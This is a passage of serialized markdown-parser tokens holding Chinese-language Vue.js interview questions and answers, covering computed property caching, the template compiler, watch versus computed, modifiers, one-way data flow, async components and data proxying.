是否是脏值，如果是，则运行函数，计算依赖，并得到对应的值，保存在 Watcher 的 value 中，然后设置 dirty 为 false，然后返回。","tokens":[{"type":"text","raw":"当读取计算属性时，vue 检查其对应的 Watcher 是否是脏值，如果是，则运行函数，计算依赖，并得到对应的值，保存在 Watcher 的 value 中，然后设置 dirty 为 false，然后返回。","text":"当读取计算属性时，vue 检查其对应的 Watcher 是否是脏值，如果是，则运行函数，计算依赖，并得到对应的值，保存在 Watcher 的 value 中，然后设置 dirty 为 false，然后返回。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"如果 dirty 为 false，则直接返回 watcher 的 value","text":"如果 dirty 为 false，则直接返回 watcher 的 value","tokens":[{"type":"text","raw":"如果 dirty 为 false，则直接返回 watcher 的 value","text":"如果 dirty 为 false，则直接返回 watcher 的 value","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"巧妙的是，在依赖收集时，被依赖的数据不仅会收集到计算属性的 Watcher，还会收集到组件的 Watcher","text":"巧妙的是，在依赖收集时，被依赖的数据不仅会收集到计算属性的 Watcher，还会收集到组件的 Watcher","tokens":[{"type":"text","raw":"巧妙的是，在依赖收集时，被依赖的数据不仅会收集到计算属性的 Watcher，还会收集到组件的 Watcher","text":"巧妙的是，在依赖收集时，被依赖的数据不仅会收集到计算属性的 Watcher，还会收集到组件的 Watcher","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"当计算属性的依赖变化时，会先触发计算属性的 Watcher 执行，此时，它只需设置 dirty 为 true 即可，不做任何处理。","text":"当计算属性的依赖变化时，会先触发计算属性的 Watcher 执行，此时，它只需设置 dirty 为 true 即可，不做任何处理。","tokens":[{"type":"text","raw":"当计算属性的依赖变化时，会先触发计算属性的 Watcher 执行，此时，它只需设置 dirty 为 true 即可，不做任何处理。","text":"当计算属性的依赖变化时，会先触发计算属性的 Watcher 执行，此时，它只需设置 dirty 为 true 即可，不做任何处理。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"由于依赖同时会收集到组件的 Watcher，因此组件会重新渲染，而重新渲染时又读取到了计算属性，由于计算属性目前已为 dirty，因此会重新运行 getter 进行运算","text":"由于依赖同时会收集到组件的 Watcher，因此组件会重新渲染，而重新渲染时又读取到了计算属性，由于计算属性目前已为 dirty，因此会重新运行 getter 进行运算","tokens":[{"type":"text","raw":"由于依赖同时会收集到组件的 Watcher，因此组件会重新渲染，而重新渲染时又读取到了计算属性，由于计算属性目前已为 dirty，因此会重新运行 getter 进行运算","text":"由于依赖同时会收集到组件的 Watcher，因此组件会重新渲染，而重新渲染时又读取到了计算属性，由于计算属性目前已为 dirty，因此会重新运行 getter 进行运算","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"而对于计算属性的 setter，则极其简单，当设置计算属性时，直接运行 setter 即可。","text":"而对于计算属性的 setter，则极其简单，当设置计算属性时，直接运行 setter 即可。","tokens":[{"type":"text","raw":"而对于计算属性的 setter，则极其简单，当设置计算属性时，直接运行 setter 即可。","text":"而对于计算属性的 setter，则极其简单，当设置计算属性时，直接运行 setter 即可。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 30. 说一下 Vue complier 的实现原理是什么样的？\\n\\n","depth":2,"text":"30. 说一下 Vue complier 的实现原理是什么样的？","tokens":[{"type":"text","raw":"30. 说一下 Vue complier 的实现原理是什么样的？","text":"30. 说一下 Vue complier 的实现原理是什么样的？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3分）\\n\\n","depth":4,"text":"解答（3分）","tokens":[{"type":"text","raw":"解答（3分）","text":"解答（3分）","escaped":false}]},{"type":"paragraph","raw":"complier 的主要作用是解析模板，生成渲染模板的 render， 而 render 的作用主要是为了生成 VNode","text":"complier 的主要作用是解析模板，生成渲染模板的 render， 而 render 的作用主要是为了生成 VNode","tokens":[{"type":"text","raw":"complier 的主要作用是解析模板，生成渲染模板的 render， 而 render 的作用主要是为了生成 VNode","text":"complier 的主要作用是解析模板，生成渲染模板的 render， 而 render 的作用主要是为了生成 VNode","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"complier 主要分为 3 大块：","text":"complier 主要分为 3 大块：","tokens":[{"type":"text","raw":"complier 主要分为 3 大块：","text":"complier 主要分为 3 大块：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* parse：接受 template 原始模板，按着模板的节点和数据生成对应的 ast\\n\\n* optimize：遍历 ast 的每一个节点，标记静态节点，这样就知道哪部分不会变化，于是在页面需要更新时，通过 diff 减少去对比这部分DOM，提升性能\\n\\n* generate 把前两步生成完善的 ast，组成 render 字符串，然后将 render 字符串通过 new Function 的方式转换成渲染函数","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* parse：接受 template 原始模板，按着模板的节点和数据生成对应的 ast\\n\\n","task":false,"loose":true,"text":"parse：接受 template 原始模板，按着模板的节点和数据生成对应的 ast\\n","tokens":[{"type":"text","raw":"parse：接受 template 原始模板，按着模板的节点和数据生成对应的 ast\\n","text":"parse：接受 template 原始模板，按着模板的节点和数据生成对应的 ast","tokens":[{"type":"text","raw":"parse：接受 template 原始模板，按着模板的节点和数据生成对应的 ast","text":"parse：接受 template 原始模板，按着模板的节点和数据生成对应的 ast","escaped":false}]}]},{"type":"list_item","raw":"* optimize：遍历 ast 的每一个节点，标记静态节点，这样就知道哪部分不会变化，于是在页面需要更新时，通过 diff 减少去对比这部分DOM，提升性能\\n\\n","task":false,"loose":true,"text":"optimize：遍历 ast 的每一个节点，标记静态节点，这样就知道哪部分不会变化，于是在页面需要更新时，通过 diff 减少去对比这部分DOM，提升性能\\n","tokens":[{"type":"text","raw":"optimize：遍历 ast 的每一个节点，标记静态节点，这样就知道哪部分不会变化，于是在页面需要更新时，通过 diff 减少去对比这部分DOM，提升性能\\n","text":"optimize：遍历 ast 的每一个节点，标记静态节点，这样就知道哪部分不会变化，于是在页面需要更新时，通过 diff 减少去对比这部分DOM，提升性能","tokens":[{"type":"text","raw":"optimize：遍历 ast 的每一个节点，标记静态节点，这样就知道哪部分不会变化，于是在页面需要更新时，通过 diff 减少去对比这部分DOM，提升性能","text":"optimize：遍历 ast 的每一个节点，标记静态节点，这样就知道哪部分不会变化，于是在页面需要更新时，通过 diff 减少去对比这部分DOM，提升性能","escaped":false}]}]},{"type":"list_item","raw":"* generate 把前两步生成完善的 ast，组成 render 字符串，然后将 render 字符串通过 new Function 的方式转换成渲染函数","task":false,"loose":true,"text":"generate 把前两步生成完善的 ast，组成 render 字符串，然后将 render 字符串通过 new Function 的方式转换成渲染函数","tokens":[{"type":"text","raw":"generate 把前两步生成完善的 ast，组成 render 字符串，然后将 render 字符串通过 new Function 的方式转换成渲染函数","text":"generate 把前两步生成完善的 ast，组成 render 字符串，然后将 render 字符串通过 new Function 的方式转换成渲染函数","tokens":[{"type":"text","raw":"generate 把前两步生成完善的 ast，组成 render 字符串，然后将 render 字符串通过 new Function 的方式转换成渲染函数","text":"generate 把前两步生成完善的 ast，组成 render 字符串，然后将 render 字符串通过 new Function 的方式转换成渲染函数","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 31. 说一下 watch 与 computed 的区别是什么？\\n\\n","depth":2,"text":"31. 说一下 watch 与 computed 的区别是什么？","tokens":[{"type":"text","raw":"31. 说一下 watch 与 computed 的区别是什么？","text":"31. 说一下 watch 与 computed 的区别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"list","raw":"* 都是观察数据变化的（相同）\\n\\n* 计算属性将会混入到 vue 的实例中，所以需要监听自定义变量；watch 监听 data 、props 里面数据的变化\\n\\n* computed 有缓存，它依赖的值变了才会重新计算，watch 没有；\\n\\n* watch 支持异步，computed 不支持；\\n\\n* watch 是一对多（监听某一个值变化，执行对应操作）；computed 是多对一（监听属性依赖于其他属性）\\n\\n* watch 监听函数接收两个参数，第一个是最新值，第二个是输入之前的值；\\n\\n* omputed 属性是函数时，都有 get 和 set 方法，默认走 get 方法，get 必须有返回值（return）","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 都是观察数据变化的（相同）\\n\\n","task":false,"loose":true,"text":"都是观察数据变化的（相同）\\n","tokens":[{"type":"text","raw":"都是观察数据变化的（相同）\\n","text":"都是观察数据变化的（相同）","tokens":[{"type":"text","raw":"都是观察数据变化的（相同）","text":"都是观察数据变化的（相同）","escaped":false}]}]},{"type":"list_item","raw":"* 计算属性将会混入到 vue 的实例中，所以需要监听自定义变量；watch 监听 data 、props 里面数据的变化\\n\\n","task":false,"loose":true,"text":"计算属性将会混入到 vue 的实例中，所以需要监听自定义变量；watch 监听 data 、props 里面数据的变化\\n","tokens":[{"type":"text","raw":"计算属性将会混入到 vue 的实例中，所以需要监听自定义变量；watch 监听 data 、props 里面数据的变化\\n","text":"计算属性将会混入到 vue 的实例中，所以需要监听自定义变量；watch 监听 data 、props 里面数据的变化","tokens":[{"type":"text","raw":"计算属性将会混入到 vue 的实例中，所以需要监听自定义变量；watch 监听 data 、props 里面数据的变化","text":"计算属性将会混入到 vue 的实例中，所以需要监听自定义变量；watch 监听 data 、props 里面数据的变化","escaped":false}]}]},{"type":"list_item","raw":"* computed 有缓存，它依赖的值变了才会重新计算，watch 没有；\\n\\n","task":false,"loose":true,"text":"computed 有缓存，它依赖的值变了才会重新计算，watch 没有；\\n","tokens":[{"type":"text","raw":"computed 有缓存，它依赖的值变了才会重新计算，watch 没有；\\n","text":"computed 有缓存，它依赖的值变了才会重新计算，watch 没有；","tokens":[{"type":"text","raw":"computed 有缓存，它依赖的值变了才会重新计算，watch 没有；","text":"computed 有缓存，它依赖的值变了才会重新计算，watch 没有；","escaped":false}]}]},{"type":"list_item","raw":"* watch 支持异步，computed 不支持；\\n\\n","task":false,"loose":true,"text":"watch 支持异步，computed 不支持；\\n","tokens":[{"type":"text","raw":"watch 支持异步，computed 不支持；\\n","text":"watch 支持异步，computed 不支持；","tokens":[{"type":"text","raw":"watch 支持异步，computed 不支持；","text":"watch 支持异步，computed 不支持；","escaped":false}]}]},{"type":"list_item","raw":"* watch 是一对多（监听某一个值变化，执行对应操作）；computed 是多对一（监听属性依赖于其他属性）\\n\\n","task":false,"loose":true,"text":"watch 是一对多（监听某一个值变化，执行对应操作）；computed 是多对一（监听属性依赖于其他属性）\\n","tokens":[{"type":"text","raw":"watch 是一对多（监听某一个值变化，执行对应操作）；computed 是多对一（监听属性依赖于其他属性）\\n","text":"watch 是一对多（监听某一个值变化，执行对应操作）；computed 是多对一（监听属性依赖于其他属性）","tokens":[{"type":"text","raw":"watch 是一对多（监听某一个值变化，执行对应操作）；computed 是多对一（监听属性依赖于其他属性）","text":"watch 是一对多（监听某一个值变化，执行对应操作）；computed 是多对一（监听属性依赖于其他属性）","escaped":false}]}]},{"type":"list_item","raw":"* watch 监听函数接收两个参数，第一个是最新值，第二个是输入之前的值；\\n\\n","task":false,"loose":true,"text":"watch 监听函数接收两个参数，第一个是最新值，第二个是输入之前的值；\\n","tokens":[{"type":"text","raw":"watch 监听函数接收两个参数，第一个是最新值，第二个是输入之前的值；\\n","text":"watch 监听函数接收两个参数，第一个是最新值，第二个是输入之前的值；","tokens":[{"type":"text","raw":"watch 监听函数接收两个参数，第一个是最新值，第二个是输入之前的值；","text":"watch 监听函数接收两个参数，第一个是最新值，第二个是输入之前的值；","escaped":false}]}]},{"type":"list_item","raw":"* omputed 属性是函数时，都有 get 和 set 方法，默认走 get 方法，get 必须有返回值（return）","task":false,"loose":true,"text":"omputed 属性是函数时，都有 get 和 set 方法，默认走 get 方法，get 必须有返回值（return）","tokens":[{"type":"text","raw":"omputed 属性是函数时，都有 get 和 set 方法，默认走 get 方法，get 必须有返回值（return）","text":"omputed 属性是函数时，都有 get 和 set 方法，默认走 get 方法，get 必须有返回值（return）","tokens":[{"type":"text","raw":"omputed 属性是函数时，都有 get 和 set 方法，默认走 get 方法，get 必须有返回值（return）","text":"omputed 属性是函数时，都有 get 和 set 方法，默认走 get 方法，get 必须有返回值（return）","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 32. 说一下你知道的 vue 修饰符都有哪些？\\n\\n","depth":2,"text":"32. 说一下你知道的 vue 修饰符都有哪些？","tokens":[{"type":"text","raw":"32. 说一下你知道的 vue 修饰符都有哪些？","text":"32. 说一下你知道的 vue 修饰符都有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"事件修饰符","text":"事件修饰符","tokens":[{"type":"text","raw":"事件修饰符","text":"事件修饰符","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* .stop：阻止冒泡。\\n\\n* .prevent：阻止默认事件。\\n\\n* .capture：使用事件捕获模式。\\n\\n* .self：只在当前元素本身触发。\\n\\n* once：只触发一次。\\n\\n* passive：默认行为将会立即触发。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* .stop：阻止冒泡。\\n\\n","task":false,"loose":true,"text":".stop：阻止冒泡。\\n","tokens":[{"type":"text","raw":".stop：阻止冒泡。\\n","text":".stop：阻止冒泡。","tokens":[{"type":"text","raw":".stop：阻止冒泡。","text":".stop：阻止冒泡。","escaped":false}]}]},{"type":"list_item","raw":"* .prevent：阻止默认事件。\\n\\n","task":false,"loose":true,"text":".prevent：阻止默认事件。\\n","tokens":[{"type":"text","raw":".prevent：阻止默认事件。\\n","text":".prevent：阻止默认事件。","tokens":[{"type":"text","raw":".prevent：阻止默认事件。","text":".prevent：阻止默认事件。","escaped":false}]}]},{"type":"list_item","raw":"* .capture：使用事件捕获模式。\\n\\n","task":false,"loose":true,"text":".capture：使用事件捕获模式。\\n","tokens":[{"type":"text","raw":".capture：使用事件捕获模式。\\n","text":".capture：使用事件捕获模式。","tokens":[{"type":"text","raw":".capture：使用事件捕获模式。","text":".capture：使用事件捕获模式。","escaped":false}]}]},{"type":"list_item","raw":"* .self：只在当前元素本身触发。\\n\\n","task":false,"loose":true,"text":".self：只在当前元素本身触发。\\n","tokens":[{"type":"text","raw":".self：只在当前元素本身触发。\\n","text":".self：只在当前元素本身触发。","tokens":[{"type":"text","raw":".self：只在当前元素本身触发。","text":".self：只在当前元素本身触发。","escaped":false}]}]},{"type":"list_item","raw":"* once：只触发一次。\\n\\n","task":false,"loose":true,"text":"once：只触发一次。\\n","tokens":[{"type":"text","raw":"once：只触发一次。\\n","text":"once：只触发一次。","tokens":[{"type":"text","raw":"once：只触发一次。","text":"once：只触发一次。","escaped":false}]}]},{"type":"list_item","raw":"* passive：默认行为将会立即触发。","task":false,"loose":true,"text":"passive：默认行为将会立即触发。","tokens":[{"type":"text","raw":"passive：默认行为将会立即触发。","text":"passive：默认行为将会立即触发。","tokens":[{"type":"text","raw":"passive：默认行为将会立即触发。","text":"passive：默认行为将会立即触发。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"按键修饰符","text":"按键修饰符","tokens":[{"type":"text","raw":"按键修饰符","text":"按键修饰符","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* .left：左键\\n\\n* .right：右键\\n\\n* .middle：滚轮\\n\\n* .enter：回车","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* .left：左键\\n\\n","task":false,"loose":true,"text":".left：左键\\n","tokens":[{"type":"text","raw":".left：左键\\n","text":".left：左键","tokens":[{"type":"text","raw":".left：左键","text":".left：左键","escaped":false}]}]},{"type":"list_item","raw":"* .right：右键\\n\\n","task":false,"loose":true,"text":".right：右键\\n","tokens":[{"type":"text","raw":".right：右键\\n","text":".right：右键","tokens":[{"type":"text","raw":".right：右键","text":".right：右键","escaped":false}]}]},{"type":"list_item","raw":"* .middle：滚轮\\n\\n","task":false,"loose":true,"text":".middle：滚轮\\n","tokens":[{"type":"text","raw":".middle：滚轮\\n","text":".middle：滚轮","tokens":[{"type":"text","raw":".middle：滚轮","text":".middle：滚轮","escaped":false}]}]},{"type":"list_item","raw":"* .enter：回车","task":false,"loose":true,"text":".enter：回车","tokens":[{"type":"text","raw":".enter：回车","text":".enter：回车","tokens":[{"type":"text","raw":".enter：回车","text":".enter：回车","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"表单修饰符","text":"表单修饰符","tokens":[{"type":"text","raw":"表单修饰符","text":"表单修饰符","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* .lazy：在文本框失去焦点时才会渲染\\n\\n* .number：将文本框中所输入的内容转换为number类型\\n\\n* .trim：可以自动过滤输入首尾的空格","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* .lazy：在文本框失去焦点时才会渲染\\n\\n","task":false,"loose":true,"text":".lazy：在文本框失去焦点时才会渲染\\n","tokens":[{"type":"text","raw":".lazy：在文本框失去焦点时才会渲染\\n","text":".lazy：在文本框失去焦点时才会渲染","tokens":[{"type":"text","raw":".lazy：在文本框失去焦点时才会渲染","text":".lazy：在文本框失去焦点时才会渲染","escaped":false}]}]},{"type":"list_item","raw":"* .number：将文本框中所输入的内容转换为number类型\\n\\n","task":false,"loose":true,"text":".number：将文本框中所输入的内容转换为number类型\\n","tokens":[{"type":"text","raw":".number：将文本框中所输入的内容转换为number类型\\n","text":".number：将文本框中所输入的内容转换为number类型","tokens":[{"type":"text","raw":".number：将文本框中所输入的内容转换为number类型","text":".number：将文本框中所输入的内容转换为number类型","escaped":false}]}]},{"type":"list_item","raw":"* .trim：可以自动过滤输入首尾的空格","task":false,"loose":true,"text":".trim：可以自动过滤输入首尾的空格","tokens":[{"type":"text","raw":".trim：可以自动过滤输入首尾的空格","text":".trim：可以自动过滤输入首尾的空格","tokens":[{"type":"text","raw":".trim：可以自动过滤输入首尾的空格","text":".trim：可以自动过滤输入首尾的空格","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 33. 怎么理解Vue的单向数据流？\\n\\n","depth":2,"text":"33. 怎么理解Vue的单向数据流？","tokens":[{"type":"text","raw":"33. 怎么理解Vue的单向数据流？","text":"33. 怎么理解Vue的单向数据流？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"单向数据流是指：数据在组件树中的流动方向，是从父组件流向子组件的。这个设计使得数据流更加可预测和易于调试，确保应用状态的一致性。","text":"单向数据流是指：数据在组件树中的流动方向，是从父组件流向子组件的。这个设计使得数据流更加可预测和易于调试，确保应用状态的一致性。","tokens":[{"type":"text","raw":"单向数据流是指：数据在组件树中的流动方向，是从父组件流向子组件的。这个设计使得数据流更加可预测和易于调试，确保应用状态的一致性。","text":"单向数据流是指：数据在组件树中的流动方向，是从父组件流向子组件的。这个设计使得数据流更加可预测和易于调试，确保应用状态的一致性。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"简单理解：父组件的状态对于子组件是只读的，子组件想改，只能通过事件的方式，通知父组件自己改。","text":"简单理解：父组件的状态对于子组件是只读的，子组件想改，只能通过事件的方式，通知父组件自己改。","tokens":[{"type":"text","raw":"简单理解：父组件的状态对于子组件是只读的，子组件想改，只能通过事件的方式，通知父组件自己改。","text":"简单理解：父组件的状态对于子组件是只读的，子组件想改，只能通过事件的方式，通知父组件自己改。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 34. Vue中怎么异步加载组件\\n\\n","depth":2,"text":"34. Vue中怎么异步加载组件","tokens":[{"type":"text","raw":"34. Vue中怎么异步加载组件","text":"34. Vue中怎么异步加载组件","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"code","raw":"```js\\n<template> \\n    <MyComponent /> \\n</template>\\n<script setup>\\nimport { defineAsyncComponent } from \'vue\'\\n\\nconst MyComponent = defineAsyncComponent(() =>\\n  import(\'./components/MyComponent.vue\')\\n)\\n<\/script>\\n```","lang":"js","text":"<template> \\n    <MyComponent /> \\n</template>\\n<script setup>\\nimport { defineAsyncComponent } from \'vue\'\\n\\nconst MyComponent = defineAsyncComponent(() =>\\n  import(\'./components/MyComponent.vue\')\\n)\\n<\/script>"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 35. 为什么this.xx可以访问data中的数据?\\n\\n","depth":2,"text":"35. 为什么this.xx可以访问data中的数据?","tokens":[{"type":"text","raw":"35. 为什么this.xx可以访问data中的数据?","text":"35. 为什么this.xx可以访问data中的数据?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"Vue在initData时，做了数据代理","text":"Vue在initData时，做了数据代理","tokens":[{"type":"text","raw":"Vue在initData时，做了数据代理","text":"Vue在initData时，做了数据代理","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* 判断传入的data，函数就执行，对象不做处理\\n\\n* data 赋值给 vm._data\\n\\n* 然后变量 vm._data对象，把可枚举属性的get代理到 vm上\\n\\n* 访问vm.xxx 就相当于 vm._data.xx === vm.data.xx","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 判断传入的data，函数就执行，对象不做处理\\n\\n","task":false,"loose":true,"text":"判断传入的data，函数就执行，对象不做处理\\n","tokens":[{"type":"text","raw":"判断传入的data，函数就执行，对象不做处理\\n","text":"判断传入的data，函数就执行，对象不做处理","tokens":[{"type":"text","raw":"判断传入的data，函数就执行，对象不做处理","text":"判断传入的data，函数就执行，对象不做处理","escaped":false}]}]},{"type":"list_item","raw":"* data 赋值给 vm._data\\n\\n","task":false,"loose":true,"text":"data 赋值给 vm._data\\n","tokens":[{"type":"text","raw":"data 赋值给 vm._data\\n","text":"data 赋值给 vm._data","tokens":[{"type":"text","raw":"data 赋值给 vm._data","text":"data 赋值给 vm._data","escaped":false}]}]},{"type":"list_item","raw":"* 然后变量 vm._data对象，把可枚举属性的get代理到 vm上\\n\\n","task":false,"loose":true,"text":"然后变量 vm._data对象，把可枚举属性的get代理到 vm上\\n","tokens":[{"type":"text","raw":"然后变量 vm._data对象，把可枚举属性的get代理到 vm上\\n","text":"然后变量 vm._data对象，把可枚举属性的get代理到 vm上","tokens":[{"type":"text","raw":"然后变量 vm._data对象，把可枚举属性的get代理到 vm上","text":"然后变量 vm._data对象，把可枚举属性的get代理到 vm上","escaped":false}]}]},{"type":"list_item","raw":"* 访问vm.xxx 就相当于 vm._data.xx === vm.data.xx","task":false,"loose":true,"text":"访问vm.xxx 就相当于 vm._data.xx === vm.data.xx","tokens":[{"type":"text","raw":"访问vm.xxx 就相当于 vm._data.xx === vm.data.xx","text":"访问vm.xxx 就相当于 vm._data.xx === vm.data.xx","tokens":[{"type":"text","raw":"访问vm.xxx 就相当于 vm._data.xx === vm.data.xx","text":"访问vm.xxx 就相当于 vm._data.xx === vm.data.xx","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 36. 父组件如何监听子组件生命周期？\\n\\n","depth":2,"text":"36. 